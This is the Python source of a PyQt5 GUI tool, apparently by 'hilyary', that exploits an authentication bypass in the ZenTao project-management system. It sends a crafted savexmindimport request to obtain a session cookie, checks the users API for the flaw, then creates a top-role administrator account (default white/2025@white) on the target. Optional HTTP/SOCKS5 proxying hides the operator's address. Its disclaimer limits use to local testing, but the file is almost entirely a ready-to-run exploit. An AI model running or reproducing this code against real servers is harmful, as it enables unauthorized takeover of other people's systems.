import sys
import requests
import socks
import socket
from PyQt5.QtWidgets import *
from PyQt5 import uic
from PyQt5.QtGui import QIcon
import re
import json

from requests.packages import urllib3
urllib3.disable_warnings()
import logging
logging.captureWarnings(True)

from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(800, 600)
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        MainWindow.setFont(font)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(10, 20, 151, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label.setFont(font)
        self.label.setObjectName("label")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(140, 20, 441, 31))
        self.lineEdit.setObjectName("lineEdit")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(590, 20, 101, 31))
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(700, 20, 93, 31))
        self.pushButton_2.setObjectName("pushButton_2")
        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(10, 90, 781, 481))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        self.tabWidget.setFont(font)
        self.tabWidget.setObjectName("tabWidget")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.textBrowser_2 = QtWidgets.QTextBrowser(self.tab)
        self.textBrowser_2.setGeometry(QtCore.QRect(10, 90, 751, 361))
        self.textBrowser_2.setObjectName("textBrowser_2")
        self.textEdit = QtWidgets.QTextEdit(self.tab)
        self.textEdit.setGeometry(QtCore.QRect(10, 10, 751, 81))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        self.textEdit.setFont(font)
        self.textEdit.setObjectName("textEdit")
        self.tabWidget.addTab(self.tab, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.label_2 = QtWidgets.QLabel(self.tab_2)
        self.label_2.setGeometry(QtCore.QRect(10, 20, 101, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.tab_2)
        self.label_3.setGeometry(QtCore.QRect(290, 20, 72, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.tab_2)
        self.lineEdit_2.setGeometry(QtCore.QRect(90, 20, 191, 31))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.tab_2)
        self.lineEdit_3.setGeometry(QtCore.QRect(350, 20, 191, 31))
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.pushButton_4 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_4.setGeometry(QtCore.QRect(560, 20, 101, 31))
        self.pushButton_4.setObjectName("pushButton_4")
        self.pushButton_3 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_3.setGeometry(QtCore.QRect(670, 20, 101, 31))
        self.pushButton_3.setObjectName("pushButton_3")
        self.textBrowser = QtWidgets.QTextBrowser(self.tab_2)
        self.textBrowser.setGeometry(QtCore.QRect(10, 80, 751, 51))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        self.textBrowser.setFont(font)
        self.textBrowser.setObjectName("textBrowser")
        self.label_4 = QtWidgets.QLabel(self.tab_2)
        self.label_4.setGeometry(QtCore.QRect(20, 90, 741, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        self.label_4.setFont(font)
        self.label_4.setObjectName("label_4")
        self.textBrowser_4 = QtWidgets.QTextBrowser(self.tab_2)
        self.textBrowser_4.setGeometry(QtCore.QRect(10, 140, 751, 311))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        self.textBrowser_4.setFont(font)
        self.textBrowser_4.setObjectName("textBrowser_4")
        self.tabWidget.addTab(self.tab_2, "")
        self.tab_3 = QtWidgets.QWidget()
        self.tab_3.setObjectName("tab_3")
        self.label_6 = QtWidgets.QLabel(self.tab_3)
        self.label_6.setGeometry(QtCore.QRect(220, 20, 71, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_6.setFont(font)
        self.label_6.setObjectName("label_6")
        self.comboBox = QtWidgets.QComboBox(self.tab_3)
        self.comboBox.setGeometry(QtCore.QRect(110, 20, 101, 31))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.lineEdit_5 = QtWidgets.QLineEdit(self.tab_3)
        self.lineEdit_5.setGeometry(QtCore.QRect(500, 20, 51, 31))
        self.lineEdit_5.setText("")
        self.lineEdit_5.setObjectName("lineEdit_5")
        self.lineEdit_4 = QtWidgets.QLineEdit(self.tab_3)
        self.lineEdit_4.setGeometry(QtCore.QRect(280, 20, 141, 31))
        self.lineEdit_4.setText("")
        self.lineEdit_4.setObjectName("lineEdit_4")
        self.label_7 = QtWidgets.QLabel(self.tab_3)
        self.label_7.setGeometry(QtCore.QRect(440, 20, 71, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_7.setFont(font)
        self.label_7.setObjectName("label_7")
        self.label_5 = QtWidgets.QLabel(self.tab_3)
        self.label_5.setGeometry(QtCore.QRect(10, 20, 131, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")
        self.pushButton_5 = QtWidgets.QPushButton(self.tab_3)
        self.pushButton_5.setGeometry(QtCore.QRect(570, 20, 201, 31))
        self.pushButton_5.setObjectName("pushButton_5")
        self.textBrowser_3 = QtWidgets.QTextBrowser(self.tab_3)
        self.textBrowser_3.setGeometry(QtCore.QRect(10, 120, 751, 341))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(10)
        self.textBrowser_3.setFont(font)
        self.textBrowser_3.setObjectName("textBrowser_3")
        self.checkBox = QtWidgets.QCheckBox(self.tab_3)
        self.checkBox.setGeometry(QtCore.QRect(570, 80, 101, 19))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.checkBox.setFont(font)
        self.checkBox.setChecked(False)
        self.checkBox.setTristate(False)
        self.checkBox.setObjectName("checkBox")
        self.lineEdit_6 = QtWidgets.QLineEdit(self.tab_3)
        self.lineEdit_6.setGeometry(QtCore.QRect(350, 70, 191, 31))
        self.lineEdit_6.setText("")
        self.lineEdit_6.setObjectName("lineEdit_6")
        self.label_8 = QtWidgets.QLabel(self.tab_3)
        self.label_8.setGeometry(QtCore.QRect(10, 70, 101, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_8.setFont(font)
        self.label_8.setObjectName("label_8")
        self.label_9 = QtWidgets.QLabel(self.tab_3)
        self.label_9.setGeometry(QtCore.QRect(290, 70, 72, 31))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(12)
        self.label_9.setFont(font)
        self.label_9.setObjectName("label_9")
        self.lineEdit_7 = QtWidgets.QLineEdit(self.tab_3)
        self.lineEdit_7.setGeometry(QtCore.QRect(90, 70, 191, 31))
        self.lineEdit_7.setText("")
        self.lineEdit_7.setObjectName("lineEdit_7")
        self.tabWidget.addTab(self.tab_3, "")
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.actionshyezh1 = QtWidgets.QAction(MainWindow)
        self.actionshyezh1.setCheckable(False)
        self.actionshyezh1.setObjectName("actionshyezh1")

        self.retranslateUi(MainWindow)
        self.tabWidget.setCurrentIndex(0)
        self.pushButton_3.clicked.connect(self.textBrowser.clear) # type: ignore
        self.pushButton_2.clicked.connect(self.textBrowser_2.clear) # type: ignore
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "禅道身份认证绕过漏洞利用工具 by hilyary"))
        MainWindow.setWindowIcon(QIcon('icon.icns'))
        self.label.setText(_translate("MainWindow", "目标URL地址："))
        self.pushButton.setText(_translate("MainWindow", "检测"))
        self.pushButton_2.setText(_translate("MainWindow", "清空"))
        self.textEdit.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'仿宋\',\'仿宋\',\'仿宋\'; font-size:10pt; font-weight:400; font-style:normal;\">\n"
"<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-family:\'SimSun\'; font-size:9pt;\">该程序仅用于安全人员本地测试使用！</span></p>\n"
"<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-family:\'SimSun\'; font-size:9pt;\">用户滥用造成的一切后果与作者无关!</span></p>\n"
"<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-family:\'SimSun\'; font-size:9pt;\">使用者请务必遵守当地法律!</span></p>\n"
"<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-family:\'SimSun\'; font-size:9pt;\">本程序不得用于商业用途，仅限学习交流!</span></p></body></html>"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("MainWindow", "综合信息"))
        self.label_2.setText(_translate("MainWindow", "用户名："))
        self.label_3.setText(_translate("MainWindow", "密码："))
        self.lineEdit_2.setText(_translate("MainWindow", "white"))
        self.lineEdit_3.setText(_translate("MainWindow", "2025@white"))
        self.pushButton_4.setText(_translate("MainWindow", "添加"))
        self.pushButton_3.setText(_translate("MainWindow", "清空"))
        self.label_4.setText(_translate("MainWindow", "此工具默认添加的用户名和密码为：white/2025@white"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("MainWindow", "添加用户"))
        self.label_6.setText(_translate("MainWindow", "地址："))
        self.comboBox.setItemText(0, _translate("MainWindow", "NULL"))
        self.comboBox.setItemText(1, _translate("MainWindow", "HTTP"))
        self.comboBox.setItemText(2, _translate("MainWindow", "SOCKS5"))
        self.label_7.setText(_translate("MainWindow", "端口："))
        self.label_5.setText(_translate("MainWindow", "设置代理："))
        self.pushButton_5.setText(_translate("MainWindow", "设置代理"))
        self.checkBox.setText(_translate("MainWindow", "认证模式"))
        self.label_8.setText(_translate("MainWindow", "用户名："))
        self.label_9.setText(_translate("MainWindow", "密码："))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate("MainWindow", "设置代理"))
        self.actionshyezh1.setText(_translate("MainWindow", "设置代理"))

class MyWindow(QtWidgets.QMainWindow,Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)

        #提取代理参数
        self.proxy_mode_qwidget = self.comboBox
        self.proxy_set_button = self.pushButton_5
        self.proxy_ip_address = self.lineEdit_4
        self.proxy_ip_port = self.lineEdit_5
        self.proxy_authentication_set = self.checkBox
        self.proxy_user_name = self.lineEdit_7
        self.proxy_pass_word = self.lineEdit_6
        self.proxy_textBrowser = self.textBrowser_3
        self.Poc_Check_textBrowser = self.textBrowser_2
        

        self.Real_IP_Res = requests.get(url="https://ifconfig.me/ip",verify=False)

        self.proxy_set_button.clicked.connect(self.Set_Proxy)

        self.http_proxy_status=0
        self.socks5_proxy_status=0
        self.Poc_Attack_Header = ""
        self.check_status = 0

        #漏洞检测
        self.chandao_attack_url = self.lineEdit
        self.chandao_check_button = self.pushButton
        self.chandao_check_clean_button = self.pushButton_2

        self.chandao_check_clean_button.clicked.connect(self.Attack_Check_Clear)

        self.chandao_check_button.clicked.connect(self.Attack_Check)


        #添加用户
        self.poc_add_username = self.lineEdit_2
        self.poc_add_password = self.lineEdit_3
        
        self.poc_add_button = self.pushButton_4  #添加用户页面添加按钮
        self.poc_add_clear_button = self.pushButton_3 #添加用户页面清空按钮
        self.Add_User_textBrowser = self.textBrowser_4 #添加用户页面输出框

        self.poc_add_button.clicked.connect(self.Attack_Poc)
        self.poc_add_clear_button.clicked.connect(self.Add_User_Clear)


    #设置代理
    def Set_Proxy(self):
        proxy_mode = self.proxy_mode_qwidget.currentText()
        ip_address = self.proxy_ip_address.text()
        ip_port = self.proxy_ip_port.text()
        proxy_username = self.proxy_user_name.text()
        proxy_password = self.proxy_pass_word.text()
        proxy_authentication = self.proxy_authentication_set

        if proxy_mode == "NULL":
            QMessageBox.critical(None,"Error","代理模式选择不正确！")

        elif proxy_mode == "HTTP":
            if proxy_authentication.isChecked():
                if proxy_username == "" or proxy_password == "":
                    QMessageBox.critical(None,"Error","开启认证模式后需填写好用户名和密码")
                else:
                    res=requests.get(url="https://ifconfig.me/ip",proxies={"http":f"http://{proxy_username}:{proxy_password}@{ip_address}:{ip_port}","https":f"http://{proxy_username}:{proxy_password}@{ip_address}:{ip_port}"},verify=False)
                    Real_IP_Res = requests.get(url="https://ifconfig.me/ip",verify=False)
                    if res.text != Real_IP_Res.text:
                        QMessageBox.information(None,"HTTP_Proxy","代理设置成功！")
                        self.http_proxy_status = 1
                        self.acctck_proxies = {"http":f"http://{proxy_username}:{proxy_password}@{ip_address}:{ip_port}","https":f"http://{proxy_username}:{proxy_password}@{ip_address}:{ip_port}"}
                        self.proxy_textBrowser.setText(f"当前代理IP为：{res.text}，代理生效中！")
                        self.proxy_textBrowser.repaint()
                    else:
                        QMessageBox.critical(None,"HTTP_Proxy","出口IP一致，代理设置失败！")
                        self.proxy_textBrowser.clear()
            else:
                if ip_address == "" or ip_port == "":
                    QMessageBox.critical(None,"Error","代理信息填写不完整！")
                else:
                    res=requests.get(url="https://ifconfig.me/ip",proxies={"http":f"http://{ip_address}:{ip_port}","https":f"http://{ip_address}:{ip_port}"},verify=False)
                    Real_IP_Res = requests.get(url="https://ifconfig.me/ip",verify=False)
                    if res.text != Real_IP_Res.text:
                        QMessageBox.information(None,"HTTP_Proxy","代理设置成功！")
                        self.http_proxy_status = 1
                        self.acctck_proxies = {"http":f"http://{proxy_username}:{proxy_password}@{ip_address}:{ip_port}","https":f"http://{proxy_username}:{proxy_password}@{ip_address}:{ip_port}"}
                        self.proxy_textBrowser.setText(f"当前代理IP为：{res.text}，代理生效中！")
                        self.proxy_textBrowser.repaint()
                    else:
                        QMessageBox.critical(None,"HTTP_Proxy","出口IP一致，代理设置失败！")
                        self.proxy_textBrowser.clear()

        elif proxy_mode == "SOCKS5":
            if proxy_authentication.isChecked():
                if ip_address == "" or ip_port == "":
                    QMessageBox.critical(None,"Error","代理信息填写不完整！")
                elif proxy_username == "" or proxy_password == "":
                    QMessageBox.critical(None,"Error","开启认证模式后需填写好用户名和密码")
                else:
                    socks.set_default_proxy(socks.SOCKS5,f"{ip_address}",int(ip_port),username=proxy_username,password=proxy_password)
                    socket.socket = socks.socksocket
                    try:
                        res=requests.get(url="https://ifconfig.me/ip",verify=False,timeout=2)
                        if res.text != self.Real_IP_Res.text:
                            QMessageBox.information(None,"SOCKS5_Proxy","代理设置成功！")
                            self.http_proxy_status= 2
                            self.proxy_textBrowser.setText(f"当前socks5代理IP为：{res.text}，代理生效中！")
                            self.proxy_textBrowser.repaint()
                        else:
                            QMessageBox.critical(None,"socks5_Proxy","出口IP一致，代理设置失败！")
                            self.proxy_textBrowser.clear()
                    except:
                        QMessageBox.critical(None,"socks5_Proxy","代理配置不可用！")
                        self.proxy_textBrowser.clear()

            else:
                if ip_address == "" or ip_port == "":
                    QMessageBox.critical(None,"Error","代理信息填写不完整！")
                else:
                    socks.set_default_proxy(socks.SOCKS5,f"{ip_address}",int(ip_port))
                    socket.socket = socks.socksocket
                    try:
                        res=requests.get(url="https://ifconfig.me/ip",verify=False,timeout=2)
                        if res.text != self.Real_IP_Res.text:
                            QMessageBox.information(None,"SOCKS5_Proxy","代理设置成功！")
                            self.http_proxy_status= 2
                            self.proxy_textBrowser.setText(f"当前socks5代理IP为：{res.text}，代理生效中！")
                            self.proxy_textBrowser.repaint()
                        else:
                            QMessageBox.critical(None,"socks5_Proxy","出口IP一致，代理设置失败！")
                            self.proxy_textBrowser.clear()
                    except:
                        QMessageBox.critical(None,"socks5_Proxy","代理配置不可用！")
                        self.proxy_textBrowser.clear()

    def Attack_Check(self):
        try:
            self.attack_url = self.chandao_attack_url.text()
            if self.attack_url != "":
                if "http://" in self.attack_url or "https://" in self.attack_url:
                    if self.http_proxy_status == 1:
                        acctck_proxies=self.acctck_proxies
                        res=requests.post(url=f"{self.attack_url}/api.php/v1/users",headers=headers,proxies=acctck_proxies,verify=False)
                        pattern = r"zentaosid=([^\s;]+)"
                        match = re.search(pattern, res.headers.get("Set-Cookie"))
                        if match:
                            zentaosid_value = match.group(1)
                            headers={"Cookie":f"zentaosid={zentaosid_value}",
                            "Connection":"close"}
                            self.Poc_Attack_Header = headers
                            res=requests.post(url=f"{self.attack_url}/zentao/api.php/v1/users",headers=headers,verify=False)
                            if res.text == '{"error":"\\u300e\\u7528\\u6237\\u540d\\u300f\\u4e0d\\u80fd\\u4e3a\\u7a7a\\u3002"}':
                                content = f"当前站点：{self.attack_url} [+存在漏洞]"
                                self.Poc_Check_textBrowser.setText(content)
                                self.Poc_Check_textBrowser.repaint()
                                self.check_status = 1

                    elif self.http_proxy_status == 2:
                        ip_address = self.proxy_ip_address.text()
                        ip_port = self.proxy_ip_port.text()
                        proxy_username = self.proxy_user_name.text()
                        proxy_password = self.proxy_pass_word.text()
                        socks.set_default_proxy(socks.SOCKS5,f"{ip_address}",int(ip_port),username=proxy_username,password=proxy_password)
                        socket.socket = socks.socksocket
                        res=requests.post(url=f"{self.attack_url}/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu",verify=False)
                        pattern = r"zentaosid=([^\s;]+)"
                        match = re.search(pattern, res.headers.get("Set-Cookie"))
                        if match:
                            zentaosid_value = match.group(1)
                            headers={"Cookie":f"zentaosid={zentaosid_value}",
                            "Connection":"close"}
                            self.Poc_Attack_Header = headers
                            res=requests.post(url=f"{self.attack_url}/zentao/api.php/v1/users",headers=headers,verify=False)
                            if res.text == '{"error":"\\u300e\\u7528\\u6237\\u540d\\u300f\\u4e0d\\u80fd\\u4e3a\\u7a7a\\u3002"}':
                                content = f"当前站点：{self.attack_url} [+存在漏洞]"
                                self.Poc_Check_textBrowser.setText(content)
                                self.Poc_Check_textBrowser.repaint()
                                self.check_status = 1
                    else:
                        res=requests.post(url=f"{self.attack_url}/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu",verify=False)
                        pattern = r"zentaosid=([^\s;]+)"
                        match = re.search(pattern, res.headers.get("Set-Cookie"))
                        if match:
                            zentaosid_value = match.group(1)
                            headers={"Cookie":f"zentaosid={zentaosid_value}",
                            "Connection":"close"}
                            self.Poc_Attack_Header = headers
                            res=requests.post(url=f"{self.attack_url}/zentao/api.php/v1/users",headers=headers,verify=False)
                            if res.text == '{"error":"\\u300e\\u7528\\u6237\\u540d\\u300f\\u4e0d\\u80fd\\u4e3a\\u7a7a\\u3002"}':
                                content = f"当前站点：{self.attack_url} [+存在漏洞]"
                                self.Poc_Check_textBrowser.setText(content)
                                self.Poc_Check_textBrowser.repaint()
                                self.check_status = 1   
                else:
                    QMessageBox.critical(None,"Error","输入的URL不正确！必须要有http://或者https://")
            else:
                QMessageBox.critical(None,"Error","检测的URL不能为空！")
        except:
            QMessageBox.critical(None,"Error","漏洞不存在！")

    def Attack_Check_Clear(self):
        self.Poc_Check_textBrowser.clear()
        self.Poc_Check_textBrowser.repaint()

    def Attack_Poc(self):
        try:
            if self.check_status == 1:
                add_username = self.poc_add_username.text()
                add_password = self.poc_add_password.text()
                ip_address = self.proxy_ip_address.text()
                ip_port = self.proxy_ip_port.text()
                proxy_username = self.proxy_user_name.text()
                proxy_password = self.proxy_pass_word.text()
                data={"account":f"{add_username}","password":f"{add_password}","realname":f"{add_username}","role":"top","group":"1"}
                if add_username == "" or add_password == "":
                    QMessageBox.critical(None,"Error","用户名或密码不能为空")
                else:
                    if self.http_proxy_status == 1:
                        res=requests.post(url=f"{self.attack_url}/zentao/api.php/v1/users",headers=self.Poc_Attack_Header,data=data,proxies=self.acctck_proxies,verify=False)
                        if '{"error":' in res.text:
                            decoded_json = json.loads(res.text)
                            error_message = decoded_json["error"]
                            self.Add_User_textBrowser.setText(str(error_message))
                            self.Poc_Check_textBrowser.repaint()
                        elif 'account' in res.text and 'id' in res.text and 'join' in res.text:
                            self.Add_User_textBrowser.setText(f"用户添加成功！用户名：{add_username},密码：{add_password}")
                            self.Poc_Check_textBrowser.repaint()

                    elif self.http_proxy_status == 2:
                        socks.set_default_proxy(socks.SOCKS5,f"{ip_address}",int(ip_port),username=proxy_username,password=proxy_password)
                        socket.socket = socks.socksocket
                        res=requests.post(url=f"{self.attack_url}/zentao/api.php/v1/users",data=data,headers=self.Poc_Attack_Header,verify=False)
                        if '{"error":' in res.text:
                            decoded_json = json.loads(res.text)
                            error_message = decoded_json["error"]
                            self.Add_User_textBrowser.setText(str(error_message))
                            self.Poc_Check_textBrowser.repaint()
                        elif 'account' in res.text and 'id' in res.text and 'join' in res.text:
                            self.Add_User_textBrowser.setText(f"用户添加成功！用户名：{add_username},密码：{add_password}")
                            self.Poc_Check_textBrowser.repaint()
                    else:
                        res=requests.post(url=f"{self.attack_url}/zentao/api.php/v1/users",headers=self.Poc_Attack_Header,data=data,verify=False)
                        if '{"error":' in res.text:
                            decoded_json = json.loads(res.text)
                            error_message = decoded_json["error"]
                            self.Add_User_textBrowser.setText(str(error_message))
                            self.Poc_Check_textBrowser.repaint()
                        elif 'account' in res.text and 'id' in res.text and 'join' in res.text:
                            self.Add_User_textBrowser.setText(f"用户添加成功！用户名：{add_username},密码：{add_password}")
                            self.Poc_Check_textBrowser.repaint()
            else:
                QMessageBox.critical(None,"Error","请先检测漏洞是否存在！")
        except:
            QMessageBox.critical(None,"Error","漏洞不存在！")


    def Add_User_Clear(self):
        self.Add_User_textBrowser.clear()
        self.Add_User_textBrowser.repaint()
        

if __name__ == '__main__':
    app = QApplication(sys.argv)
    
    app.setWindowIcon(QIcon('icon.icns'))

    w = MyWindow()
    
    w.show()

    app.exec()
